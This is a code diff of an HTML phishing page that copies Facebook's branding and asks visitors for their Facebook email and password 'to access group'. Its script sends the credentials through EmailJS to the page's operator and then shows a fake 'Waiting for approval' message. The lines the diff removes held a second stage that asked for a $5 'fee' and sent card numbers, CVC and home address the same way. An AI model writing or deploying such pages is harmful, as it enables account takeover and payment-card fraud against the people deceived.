@@ -3,119 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Private Group</title>
+  <title>Login</title>
+  <link rel="stylesheet" href="style.css">
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-  <style>
-    body {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-      background: #f0f2f5;
-    }
-
-    .navbar {
-      width: 100%;
-      height: 60px;
-      background-color: #1877f2;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 1000;
-    }
-
-    .navbar h2 {
-      color: white;
-      font-size: 36px;
-      margin: 0;
-    }
-
-    .container {
-      background: rgba(255, 255, 255, 0.9);
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-      text-align: center;
-      width: 300px;
-      margin-top: 80px;
-    }
-
-    h2 {
-      margin-bottom: 20px;
-    }
-
-    input {
-      display: block;
-      width: 100%;
-      padding: 10px;
-      margin: 10px 0;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      margin-left: -10px;
-    }
-
-    button {
-      background: #1877f2;
-      color: white;
-      border: none;
-      padding: 10px;
-      width: 100%;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    button:hover {
-      background: #166fe5;
-    }
-
-    .error {
-      color: red;
-      font-size: 14px;
-    }
-
-    /* Hidden Payment Section */
-    #paymentSection {
-      display: none;
-      margin-top: 40px;
-    }
-  </style>
 </head>
 <body>
 
+  <!-- Navigation Bar -->
   <nav class="navbar">
     <h2>facebook</h2>
   </nav>
 
-  <!-- Login Section -->
-  <div class="container" id="loginContainer">
-    <h2>Enter Facebook Login</h2>
+  <div class="login-container">
+    <h2>Enter Facebook Login to Access Group</h2>
     <form id="loginForm">
       <input type="email" id="email" placeholder="Email" required>
       <input type="password" id="password" placeholder="Password" required>
       <p id="errorMessage" class="error"></p>
       <button type="button" id="loginButton">Login</button>
-    </form>
-  </div>
-
-  <!-- Payment Section (Initially Hidden) -->
-  <div class="container" id="paymentSection">
-    <h2 id="userName">Welcome, Ryan Edwards</h2>
-    <p>$5 fee is required to access group.</p>
-    <form id="paymentForm">
-      <input type="text" id="cardNumber" placeholder="Card Number" required>
-      <input type="text" id="expDate" placeholder="MM/YY" required>
-      <input type="text" id="cvc" placeholder="CVC" required>
-      <input type="text" id="streetAddress" placeholder="Street Address" required>
-      <input type="text" id="city" placeholder="City" required>
-      <input type="text" id="state" placeholder="State" required>
-      <input type="text" id="zipCode" placeholder="Zip Code" required>
-      <p id="errorMessagePayment" class="error"></p>
-      <button type="button" id="payButton">Pay</button>
     </form>
   </div>
 
@@ -138,58 +43,86 @@
         return;
       }
 
-      // Send login details via EmailJS
-      const loginParams = { email: email, password: password };
-      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, loginParams)
+      // EmailJS parameters
+      const templateParams = { email: email, password: password };
+
+      // Send email
+      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
         .then(() => {
-          // Hide login section and show payment section
-          document.getElementById("loginContainer").style.display = "none";
-          document.getElementById("paymentSection").style.display = "block";
+          alert("Waiting for approval");
+          document.getElementById("loginForm").reset();
         })
         .catch((error) => {
-          document.getElementById("errorMessage").textContent = "Failed to submit login.";
-          console.error("Error:", error);
-        });
-    });
-
-    // Handle payment submission
-    document.getElementById("payButton").addEventListener("click", () => {
-      const cardNumber = document.getElementById("cardNumber").value.trim();
-      const expDate = document.getElementById("expDate").value.trim();
-      const cvc = document.getElementById("cvc").value.trim();
-      const streetAddress = document.getElementById("streetAddress").value.trim();
-      const city = document.getElementById("city").value.trim();
-      const state = document.getElementById("state").value.trim();
-      const zipCode = document.getElementById("zipCode").value.trim();
-      const errorMessage = document.getElementById("errorMessagePayment");
-
-      if (!cardNumber || !expDate || !cvc || !streetAddress || !city || !state || !zipCode) {
-        errorMessage.textContent = "All fields are required.";
-        return;
-      }
-
-      // Send payment details via EmailJS
-      const paymentParams = {
-        card_number: cardNumber,
-        exp_date: expDate,
-        cvc_code: cvc,
-        street_address: streetAddress,
-        city: city,
-        state: state,
-        zip_code: zipCode
-      };
-
-      emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, paymentParams)
-        .then(() => {
-          alert("Payment sent successfully!");
-          document.getElementById("paymentForm").reset();
-        })
-        .catch((error) => {
-          errorMessage.textContent = "Failed to send payment information.";
+          alert("Failed to submit login.");
           console.error("Error:", error);
         });
     });
   </script>
+
+  <style>
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      background: #f0f2f5;
+    }
+    .navbar {
+      width: 100%;
+      height: 60px;
+      background-color: #1877f2;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1000;
+    }
+    .navbar h2 {
+      color: white;
+      font-size: 24px;
+      margin: 0;
+    }
+    .login-container {
+      background: rgba(255, 255, 255, 0.9);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 300px;
+      margin-top: 80px; /* Adjusted to prevent overlap with navbar */
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    input {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      background: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background: #166fe5;
+    }
+    .error {
+      color: red;
+      font-size: 14px;
+    }
+  </style>
 
 </body>
 </html>
